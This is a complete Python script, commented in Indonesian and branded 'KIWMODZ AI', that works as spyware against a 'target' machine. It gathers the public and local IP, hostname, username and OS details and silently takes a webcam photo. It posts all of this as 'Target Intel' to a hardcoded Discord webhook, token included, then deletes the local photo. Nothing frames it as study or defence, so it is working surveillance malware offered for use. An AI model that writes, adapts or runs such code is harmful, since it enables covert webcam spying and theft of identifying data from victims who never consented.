import cv2
import requests
import platform
import socket
import os
import json
import tempfile
import datetime

### KONFIGURASI ###
# Ganti dengan URL Discord Webhook Anda. Ini adalah URL yang Anda dapatkan dari pengaturan channel Discord.
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1192882784151277639/F5MRpMkaptLtqH0CAANmvfBGcrzm09OrHVYXz0ZgJ3in44j8T92YLd3b9_YD2ocF2BKg" 

# Opsional: URL Avatar dan Icon untuk bot Discord Anda. Ganti dengan URL gambar Anda.
BOT_AVATAR_URL = "https://cdn.discordapp.com/embed/avatars/0.png" # Contoh: Avatar default Discord
BOT_ICON_URL = "https://cdn.discordapp.com/embed/avatars/0.png"   # Contoh: Icon default Discord

### FUNGSI UTILITAS ###

def get_public_ip():
    """
    Mendapatkan alamat IP publik dari target dengan menghubungi API eksternal.
    """
    try:
        response = requests.get("https://api.ipify.org?format=json", timeout=5)
        response.raise_for_status() # Akan memunculkan HTTPError untuk status kode 4xx/5xx
        ip_data = response.json()
        return ip_data.get("ip", "Tidak diketahui")
    except requests.exceptions.RequestException as e:
        return f"Gagal mendapatkan IP publik: {e}"

def get_local_ip():
    """
    Mendapatkan alamat IP lokal dari antarmuka jaringan aktif target.
    """
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        # Menghubungkan ke alamat eksternal (tidak mengirim data) untuk mendapatkan IP lokal yang aktif
        s.connect(("8.8.8.8", 80)) 
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except Exception as e:
        return f"Gagal mendapatkan IP lokal: {e}"

def get_machine_name():
    """
    Mendapatkan nama mesin (hostname) dari sistem operasi Windows target.
    """
    return platform.node()

def capture_webcam_photo():
    """
    Mengambil foto dari webcam yang tersambung pada indeks 0 (biasanya webcam utama).
    Mengembalikan path file foto yang disimpan dan status kamera.
    """
    cap = cv2.VideoCapture(0) # 0 adalah indeks default untuk webcam pertama

    if not cap.isOpened():
        print("[KIWMODZ AI] ⚡️ Camera not aktif. Tidak ada kamera terdeteksi atau tidak dapat diakses.")
        return None, "Camera not aktif"

    ret, frame = cap.read() # Membaca satu frame dari kamera

    if not ret:
        print("[KIWMODZ AI] ⚠️ Gagal mengambil frame dari kamera.")
        cap.release()
        return None, "Gagal mengambil frame"

    # Simpan gambar ke file sementara di direktori temp sistem
    temp_dir = tempfile.gettempdir()
    photo_filename = os.path.join(temp_dir, "kiwmodz_webcam_capture.jpg")
    cv2.imwrite(photo_filename, frame)
    
    cap.release() # Lepaskan kamera setelah selesai
    print(f"[KIWMODZ AI] ✅ Foto berhasil diambil dan disimpan sementara di: {photo_filename}")
    return photo_filename, "Foto berhasil diambil"

def send_to_discord(webhook_url, ip_public, ip_local, machine_name, photo_path=None, camera_status="Tidak diketahui"):
    """
    Mengirim semua informasi yang terkumpul, termasuk foto (jika ada), ke Discord Webhook.
    """
    if not webhook_url or webhook_url == "YOUR_DISCORD_WEBHOOK_URL_HERE":
        print("[KIWMODZ AI] ❌ ERROR: URL Discord Webhook belum dikonfigurasi. Silakan ganti 'YOUR_DISCORD_WEBHOOK_URL_HERE' dengan URL webhook Anda.")
        return

    # Mendapatkan nama user yang sedang login
    current_user = os.getenv('USERNAME', 'Tidak Diketahui') 

    # Buat objek embed untuk tampilan yang lebih rapi di Discord
    embed = {
        "title": "KIWMODZ AI - 🎯 Target Intel",
        "description": f"Data dari target **`{current_user}`** berhasil didapatkan pada `{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}` WIB.",
        "color": 0x00FF00, # Warna hijau
        "fields": [
            {"name": "🖥️ Nama Mesin", "value": f"```ini\n{machine_name}\n```", "inline": False},
            {"name": "🌐 IP Publik", "value": f"```apache\n{ip_public}\n```", "inline": True},
            {"name": "🏠 IP Lokal", "value": f"```apache\n{ip_local}\n```", "inline": True},
            {"name": "📸 Status Kamera", "value": f"```fix\n{camera_status}\n```", "inline": False}
        ],
        "footer": {
            "text": f"KIWMODZ AI | {platform.system()} {platform.release()} - {platform.architecture()[0]}",
            "icon_url": BOT_ICON_URL
        },
        "timestamp": datetime.datetime.utcnow().isoformat() + "Z" # Waktu UTC untuk Discord
    }

    files = {}
    payload = {
        "embeds": [embed],
        "username": "KIWMODZ AI Bot",
        "avatar_url": BOT_AVATAR_URL
    }

    if photo_path and os.path.exists(photo_path):
        # Tambahkan file foto ke dictionary files
        files['file'] = (os.path.basename(photo_path), open(photo_path, 'rb'), 'image/jpeg')
        # Atur URL gambar di embed agar Discord menampilkannya dari attachment
        embed["image"] = {"url": f"attachment://{os.path.basename(photo_path)}"}
        
        # Ketika mengirim file, payload JSON harus dikirim sebagai field 'payload_json'
        files['payload_json'] = (None, json.dumps(payload), 'application/json')
        response = requests.post(webhook_url, files=files)
    else:
        # Jika tidak ada file, kirim payload JSON secara langsung
        headers = {'Content-Type': 'application/json'}
        response = requests.post(webhook_url, data=json.dumps(payload), headers=headers)

    if response.status_code == 204:
        print("[KIWMODZ AI] ✅ Informasi berhasil dikirim ke Discord.")
    else:
        print(f"[KIWMODZ AI] ❌ Gagal mengirim informasi ke Discord. Status: {response.status_code}, Respons: {response.text}")
    
    # Hapus file foto sementara setelah dikirim untuk menjaga kebersihan sistem
    if photo_path and os.path.exists(photo_path):
        os.remove(photo_path)
        print(f"[KIWMODZ AI] 🗑️ File foto sementara dihapus: {photo_path}")

### EKSEKUSI UTAMA ###

def main():
    """
    Fungsi utama untuk menjalankan seluruh proses pengumpulan dan pengiriman data.
    """
    print(f"[KIWMODZ AI] Memulai pengumpulan informasi target pada {datetime.datetime.now().strftime('%d-%m-%Y %H:%M:%S')} WIB...")

    # 1. Mendapatkan informasi IP dan nama mesin
    public_ip = get_public_ip()
    local_ip = get_local_ip()
    machine_name = get_machine_name()
    
    print(f"[KIWMODZ AI] 🌐 IP Publik: {public_ip}")
    print(f"[KIWMODZ AI] 🏠 IP Lokal: {local_ip}")
    print(f"[KIWMODZ AI] 🖥️ Nama Mesin: {machine_name}")

    # 2. Mengambil foto dari webcam
    photo_path, camera_status_message = capture_webcam_photo()
    
    # 3. Mengirim semua data ke Discord Webhook
    send_to_discord(
        DISCORD_WEBHOOK_URL,
        public_ip,
        local_ip,
        machine_name,
        photo_path,
        camera_status_message
    )
    print("[KIWMODZ AI] ✨ Proses selesai.")

if __name__ == "__main__":
    main()